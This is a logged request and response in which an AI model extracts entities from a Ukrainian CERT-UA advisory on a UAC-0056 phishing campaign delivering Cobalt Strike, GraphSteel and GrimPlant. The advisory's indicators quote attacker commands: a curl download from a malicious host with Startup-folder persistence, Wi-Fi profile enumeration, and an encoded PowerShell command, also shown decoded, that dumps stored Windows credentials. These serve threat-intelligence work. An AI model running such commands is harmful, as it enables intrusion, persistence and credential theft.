@@ -1,0 +1,292 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Security Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Software Vulnerability, Vulnerability, Common Vulnerabilities and Exposures)
+- Software Product: An application, operating system, or suite of computer programs designed to perform specific tasks or functions. (also: Software, Software Application)
+- Software Vendor: An organization or company that develops, distributes, or maintains software, hardware, or related technology products and services. (also: Technology Vendor, Software Developer, Vendor)
+- Country: A distinct territorial body or sovereign state with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Government Organization: An official agency, ministry, or administrative body operating as part of a national or state government. (also: Government Agency, Government Body, State Authority)
+- Malware: Malicious software, code, or executables designed to infiltrate, damage, or compromise computer systems and data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address specifying the location and retrieval mechanism of a resource on a computer network. (also: URL, Web Address, Web Link)
+- Person: An individual human being, such as a government official, cybersecurity expert, researcher, or executive. (also: Individual, Natural Person)
+- IP Address: A numerical label assigned to a device connected to a computer network that uses the Internet Protocol for communication. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Electronic Mail Address)
+- Computer File: A digital resource or named item stored on a computer system, containing data, code, or instructions. (also: File, Digital File, Filename)
+- Company: A commercial business, corporation, or enterprise operating in any economic sector or industry. (also: Enterprise, Corporation, Commercial Organization)
+- Domain Name: A human-readable identification string defining a realm of administrative autonomy or resource location within the Internet Domain Name System. (also: Internet Domain, FQDN, Fully Qualified Domain Name)
+- Threat Actor: An individual, group, or organization responsible for malicious cyber activities, attacks, or cyber espionage operations. (also: Threat Group, Cyber Threat Actor, Hacker Group)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p class="ql-align-justify"><em style="color: rgb(36, 36, 36);">Оновлено 12.03.2022</em></p><p class="ql-align-justify"><strong>Загальна інформація</strong></p><p class="ql-align-justify">Урядовою командою реагування на комп’ютерні надзвичайні події України CERT-UA від суб'єктів координації отримано повідомлення про масове розповсюдження електронних листів від імені державних органів України з інструкціями щодо підвищення рівня інформаційної безпеки. У тілі листа знаходиться посилання на веб-сайт hxxps://forkscenter[.]fr/, з якого пропонується завантажити "критичні оновлення" у вигляді файлу "BitdefenderWindowsUpdatePackage.exe" розміром близько 60МБ.</p><p class="ql-align-justify">З'ясовано, що згаданий файл забезпечить виконання завантажувача "alt.exe", який здійснить завантаження файлів "one.exe" та "dropper.exe" з сервісу Discord та їхній запуск. В рамках дослідження визначено, що запуск "one.exe" призведе до ураження комп'ютера шкідливою програмою Cobalt Strike Beacon, а також завантаження і виконання файлу "wisw.exe", який, у свою чергу, мав би завантажити з Discord та виконати файл "cesdf.exe" (не доступний на момент аналізу).</p><p class="ql-align-justify">Файл "dropper.exe" здійснить завантаження, base64-декодування, збереження на диск та виконання файлу "java-sdk.exe". Останній, окрім забезпечення персистентності через реєстр Windows, також здійснить завантаження, base64-декодуання, збереження на диск та виконання двох інших файлів: "microsoft-cortana.exe", що класифіковано як бекдор GraphSteel, та "oracle-java.exe", який класифіковано як бекдор GrimPlant.</p><p class="ql-align-justify">Зауважимо, що EXE-файли (завантажувачі з Discord) захищено протектором Themida.</p><p class="ql-align-justify">З середнім рівнем впевненості асоціюємо виявлену активність з діяльністю групи UAC-0056.</p><p><br></p><p class="ql-align-justify"><strong>Індикатори компрометації</strong>&nbsp;</p><p><em>Файли:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">ca9290709843584aecbd6564fb978bd6    Інструкція з антивірусного захисту.doc (документ-приманка)
+cf204319f7397a6a31ecf76c9531a549    Інструкція користувачів.doc (документ-приманка)
+b8b7a10dcc0dad157191620b5d4e5312    BitdefenderWindowsUpdatePackage.exe
+2fdf9f3a25e039a41e743e19550d4040    alt.exe (Discord downloader)
+aa5e8268e741346c76ebfd1f27941a14    one.exe (містить Cobalt Strike Beacon)
+9ad4a2dfd4cb49ef55f2acd320659b83    wisw.exe (Discord downloader) (2022-03-06 10:36:07)
+15c525b74b7251cfa1f7c471975f3f95    dropper.exe (Go downloader)
+c8bf238641621212901517570e96fae7    java-sdk.exe (Go downloader)
+4f11abdb96be36e3806bada5b8b2b8f8    oracle-java.exe (GrimPlant)
+9ea3aaaeb15a074cd617ee1dfdda2c26    microsoft-cortana.exe (GraphSteel) (2022-03-01 17:23:26)
+</pre><p><br></p><p><em>Мережеві:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">hxxps://forkscenter[.]fr/BitdefenderWindowsUpdatePackage.exe
+hxxps://forkscenter[.]fr/Sdghrt_umrj6/wisw.exe
+hxxps://cdn.discordapp[.]com/attachments/947916997713358890/949948174636830761/one.exe
+hxxps://cdn.discordapp[.]com/attachments/947916997713358890/949948174838165524/dropper.exe
+hxxps://cdn.discordapp[.]com/attachments/947916997713358890/949978571680673802/cesdf.exe
+hxxps://nirsoft[.]me/s/2MYmbwpSJLZRAtXRgNTAUjJSH6SSoicLPIrQl/field-keywords/
+hxxps://nirsoft[.]me/nEDFzTtoCbUfp9BtSZlaq6ql8v6yYb/avp/amznussraps/
+hxxp://45[.]84.0.116:443/i
+hxxp://45[.]84.0.116:443/m
+hxxp://45[.]84.0.116:443/p
+ws://45[.]84.0.116:443/c
+forkscenter[.]fr (2022-01-29)
+nirsoft[.]me    (2022-02-17)
+45[.]84.0.116
+156[.]146.50.5
+-hobot- (User-Agent)
+</pre><p><br></p><p><em>Хостові:</em>&nbsp;</p><pre class="ql-syntax" spellcheck="false">%TMP%\alt.exe
+%PROGRAMDATA%\one.exe
+%PROGRAMDATA%\dropper.exe
+%USERPROFILE%\.java-sdk\java-sdk.exe
+%USERPROFILE%\.java-sdk\oracle-java.exe
+%USERPROFILE%\.java-sdk\microsoft-cortana.exe
+%USERPROFILE%\AppData\Local\Temp\wisw.exe
+%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BitdefenderControl.lnk
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Java-SDK
+
+C:\Windows\System32\cmd.exe /C cd %USERPROFILE%\AppData\Local\Temp\ &amp; curl -O hxxps://forkscenter[.]fr/Sdghrt_umrj6/wisw.exe &amp; mklink %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\BitdefenderControl.lnk %USERPROFILE%\AppData\Local\Temp\wisw.exe
+C:\Windows\System32\cmd.exe /C cd / &amp; dir /S &gt; %USERPROFILE%\AppData\Local\Temp\Rsjdjfvj.txt &amp; ipconfig /all &gt; %USERPROFILE%\AppData\Local\Temp\Rsjdrnjngfvj.txt
+ipconfig /all
+cmd /Q /C netsh wlan show profiles
+netsh wlan show profiles
+powershell /Q /C -encodedCommand WwB2AG8AaQBkAF0AWwBXAGkAbgBkAG8AdwBzAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAC4AUABhAHMAcwB3AG8AcgBkAFYAYQB1AGwAdAAsAFcAaQBuAGQAbwB3AHMALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMALABDAG8AbgB0AGUAbgB0AFQAeQBwAGUAPQBXAGkAbgBkAG8AdwBzAFIAdQBuAHQAaQBtAGUAXQA7ACQAdgBhAHUAbAB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABXAGkAbgBkAG8AdwBzAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAC4AUABhAHMAcwB3AG8AcgBkAFYAYQB1AGwAdAA7ACQAdgBhAHUAbAB0AC4AUgBlAHQAcgBpAGUAdgBlAEEAbABsACgAKQAgAHwAIAAlACAAewAgACQAXwAuAFIAZQB0AHIAaQBlAHYAZQBQAGEAcwBzAHcAbwByAGQAKAApADsAJABfAH0AIAB8ACAAUwBlAGwAZQBjAHQAIABVAHMAZQByAE4AYQBtAGUALAAgAFIAZQBzAG8AdQByAGMAZQAsACAAUABhAHMAcwB3AG8AcgBkACAAfAAgAEYAbwByAG0AYQB0AC0AVABhAGIAbABlACAALQBIAGkAZABlAFQAYQBiAGwAZQBIAGUAYQBkAGUAcgBzAA==
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_} | Select UserName, Resource, Password | Format-Table -HideTableHeaders
+</pre><p><br></p><p><strong>Додаткова інформація</strong>&nbsp;</p><p>GraphSteel - шкідлива програма, розроблена з використанням мови програмування GoLang. Визначає базову інформацію про комп'ютер (hostname, username, IP-адреса), викрадення автентифікаційних даних, виконання команд, вивантаження файлів. Для комунікації з сервером управління використовується WebSocket та GraphQL; інформаційні потоки шифруються за допомогою AES та кодуються base64.</p><p>GrimPlant - шкідлива програма, розроблена з використанням мови програмування GoLang. Визначає базову інформацію про комп'ютер (IP-адреса, Hostname, OS, Username, HomeDir), а також виконує команди, отримані з серверу управління, та відправляє результат їх виконання. В якості протоколу використовується gRPC (Protocol Buffers + HTTP/2 + SSL). Адреса серверу управління передається як аргумент в командному рядку.</p><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (6.8s, in 4384 / out 1778 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "UAC-0056",
+      "kind": "threat actor",
+      "gloss": "A cyber espionage and threat group targeting Ukrainian organizations."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "Cobalt Strike Beacon",
+      "kind": "malware",
+      "gloss": "A post-exploitation agent and remote access tool used for penetration testing and malicious operations."
+    },
+    {
+      "name": "GraphSteel",
+      "kind": "malware",
+      "gloss": "A backdoor malware written in GoLang designed to gather system information and steal credentials."
+    },
+    {
+      "name": "GrimPlant",
+      "kind": "malware",
+      "gloss": "A backdoor malware written in GoLang that executes commands received via gRPC."
+    },
+    {
+      "name": "Themida",
+      "kind": "software product",
+      "gloss": "A commercial software protection system used to pack and obfuscate executables against reverse engineering."
+    },
+    {
+      "name": "BitdefenderWindowsUpdatePackage.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable disguised as a security update package."
+    },
+    {
+      "name": "alt.exe",
+      "kind": "computer file",
+      "gloss": "A malicious downloader executable used to retrieve additional payloads."
+    },
+    {
+      "name": "one.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable containing Cobalt Strike Beacon."
+    },
+    {
+      "name": "dropper.exe",
+      "kind": "computer file",
+      "gloss": "A malicious GoLang-based dropper executable."
+    },
+    {
+      "name": "wisw.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable used as a downloader."
+    },
+    {
+      "name": "cesdf.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable payload hosted on Discord."
+    },
+    {
+      "name": "java-sdk.exe",
+      "kind": "computer file",
+      "gloss": "A malicious GoLang-based downloader executable."
+    },
+    {
+      "name": "microsoft-cortana.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable payload containing the GraphSteel backdoor."
+    },
+    {
+      "name": "oracle-java.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable payload containing the GrimPlant backdoor."
+    },
+    {
+      "name": "Інструкція з антивірусного захисту.doc",
+      "kind": "computer file",
+      "gloss": "A lure document used in phishing campaigns."
+    },
+    {
+      "name": "Інструкція користувачів.doc",
+      "kind": "computer file",
+      "gloss": "A lure document used in phishing campaigns."
+    },
+    {
+      "name": "forkscenter[.]fr",
+      "kind": "domain name",
+      "gloss": "A domain name used to host malicious files."
+    },
+    {
+      "name": "nirsoft[.]me",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity."
+    },
+    {
+      "name": "45[.]84.0.116",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious command and control infrastructure."
+    },
+    {
+      "name": "156[.]146.50.5",
+      "kind": "ip address",
+      "gloss": "An IP address identified as network infrastructure in cyber attacks."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0056",
+      "type": "uses",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "асоціюємо виявлену активність з діяльністю групи UAC-0056"
+    },
+    {
+      "head": "UAC-0056",
+      "type": "uses",
+      "tail": "GraphSteel",
+      "evidence": "асоціюємо виявлену активність з діяльністю групи UAC-0056"
+    },
+    {
+      "head": "UAC-0056",
+      "type": "uses",
+      "tail": "GrimPlant",
+      "evidence": "асоціюємо виявлену активність з діяльністю групи UAC-0056"
+    },
+    {
+      "head": "BitdefenderWindowsUpdatePackage.exe",
+      "type": "delivers",
+      "tail": "alt.exe",
+      "evidence": "файл забезпечить виконання завантажувача \"alt.exe\""
+    },
+    {
+      "head": "alt.exe",
+      "type": "delivers",
+      "tail": "one.exe",
+      "evidence": "здійснить завантаження файлів \"one.exe\" та \"dropper.exe\""
+    },
+    {
+      "head": "alt.exe",
+      "type": "delivers",
+      "tail": "dropper.exe",
+      "evidence": "здійснить завантаження файлів \"one.exe\" та \"dropper.exe\""
+    },
+    {
+      "head": "one.exe",
+      "type": "delivers",
+      "tail": "Cobalt Strike Beacon",
+      "evidence": "запуск \"one.exe\" призведе до ураження комп'ютера шкідливою програмою Cobalt Strike Beacon"
+    },
+    {
+      "head": "one.exe",
+      "type": "delivers",
+      "tail": "wisw.exe",
+      "evidence": "а також завантаження і виконання файлу \"wisw.exe\""
+    },
+    {
+      "head": "dropper.exe",
+      "type": "delivers",
+      "tail": "java-sdk.exe",
+      "evidence": "здійснить завантаження, base64-декодування, збереження на диск та виконання файлу \"java-sdk.exe\""
+    },
+    {
+      "head": "java-sdk.exe",
+      "type": "delivers",
+      "tail": "microsoft-cortana.exe",
+      "evidence": "збереження на диск та виконання двох інших файлів: \"microsoft-cortana.exe\""
+    },
+    {
+      "head": "java-sdk.exe",
+      "type": "delivers",
+      "tail": "oracle-java.exe",
+      "evidence": "виконання двох інших файлів: \"microsoft-cortana.exe\" ... та \"oracle-java.exe\""
+    },
+    {
+      "head": "forkscenter[.]fr",
+      "type": "hosts",
+      "tail": "BitdefenderWindowsUpdatePackage.exe",
+      "evidence": "посилання на веб-сайт hxxps://forkscenter[.]fr/, з якого пропонується завантажити \"критичні оновлення\" у вигляді файлу \"BitdefenderWindowsUpdatePackage.exe\""
+    }
+  ],
+  "newRelationTypes": []
+}
